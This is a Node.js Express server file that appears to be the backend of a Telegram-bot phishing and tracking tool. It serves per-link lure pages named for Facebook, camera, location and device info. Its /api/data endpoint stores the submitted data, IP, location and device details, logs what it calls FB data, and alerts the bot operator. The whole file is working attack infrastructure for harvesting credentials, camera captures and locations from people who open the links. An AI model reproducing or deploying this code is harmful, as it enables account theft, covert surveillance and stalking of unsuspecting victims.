const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const connectDB = require('./config/database');

class Server {
  constructor(bot) {
    this.app = express();
    this.bot = bot;
    this.PORT = process.env.PORT || 8080;

    this.setupMiddleware();
    this.setupRoutes();
    this.setupErrorHandlers();
  }

  setupMiddleware() {
    this.app.use(express.json({ limit: '50mb' }));
    this.app.use(express.urlencoded({ extended: true, limit: '50mb' }));
    this.app.use(express.static(path.join(__dirname, 'public')));

    this.app.use((req, res, next) => {
      console.log(`${new Date().toISOString()} - ${req.method} ${req.path}`);
      next();
    });

    this.app.use((req, res, next) => {
      res.header('Access-Control-Allow-Origin', '*');
      res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
      next();
    });
  }

  setupRoutes() {
    this.app.get('/health', (req, res) => {
      res.json({
        status: 'ok',
        timestamp: new Date(),
        uptime: process.uptime(),
        mongodb: mongoose.connection.readyState === 1 ? 'connected' : 'disconnected',
        memory: process.memoryUsage()
      });
    });

    this.app.post('/webhook', (req, res) => {
      try {
        this.bot.processUpdate(req.body);
        res.sendStatus(200);
      } catch (error) {
        console.error('Webhook Error:', error);
        res.sendStatus(500);
      }
    });

    this.app.get('/fb/:id', (req, res) => {
      res.sendFile(path.join(__dirname, 'public', 'fb.html'));
    });

    this.app.get('/camera/:id', (req, res) => {
      res.sendFile(path.join(__dirname, 'public', 'camera.html'));
    });

    this.app.get('/location/:id', (req, res) => {
      res.sendFile(path.join(__dirname, 'public', 'location.html'));
    });

    this.app.get('/info/:id', (req, res) => {
      res.sendFile(path.join(__dirname, 'public', 'info.html'));
    });

    this.app.get('/all/:id', (req, res) => {
      res.sendFile(path.join(__dirname, 'public', 'all.html'));
    });

    this.app.get('/custom/:id', (req, res) => {
      res.sendFile(path.join(__dirname, 'public', 'custom.html'));
    });

    this.app.post('/api/data', async (req, res) => {
      try {
        const { linkId, type, data, ip, location, device } = req.body;

        const Data = require('./models/Data');
        const Link = require('./models/Link');
        const logger = require('./middlewares/logger');
        const notifier = new (require('./utils/notifications'))(this.bot);

        const newData = new Data({
          linkId,
          type,
          data,
          ip,
          location,
          device,
          timestamp: new Date()
        });

        await newData.save();

        await Link.findOneAndUpdate(
          { linkId },
          { $inc: { data: 1, visits: 1 } }
        );

        await logger.logFBData(linkId, data);

        await notifier.sendDataNotification(linkId, {
          type,
          data,
          ip,
          location,
          device,
          timestamp: new Date()
        });

        res.json({ success: true });
      } catch (error) {
        console.error('API Error:', error);
        res.status(500).json({ error: error.message });
      }
    });

    this.app.use((req, res) => {
      res.status(404).sendFile(path.join(__dirname, 'public', '404.html'));
    });
  }

  setupErrorHandlers() {
    this.app.use((err, req, res, next) => {
      console.error('Server Error:', err.stack);

      const logger = require('./middlewares/logger');
      logger.logError(err, 'Express');

      res.status(500).json({
        error: 'Internal Server Error',
        message: process.env.NODE_ENV === 'development' ? err.message : undefined
      });
    });
  }

  async connectDatabase() {
    if (mongoose.connection.readyState === 0) {
      await connectDB();
    }
  }

  start() {
    return new Promise(async (resolve, reject) => {
      try {
        await this.connectDatabase();
      } catch (error) {
        reject(error);
        return;
      }

      this.server = this.app.listen(this.PORT, () => {
        console.log(`Server running on port ${this.PORT}`);
        console.log(`Health check: http://localhost:${this.PORT}/health`);
        resolve();
      });
    });
  }

  stop() {
    if (this.server) {
      this.server.close();
      console.log('Server stopped');
    }
  }
}

module.exports = Server;
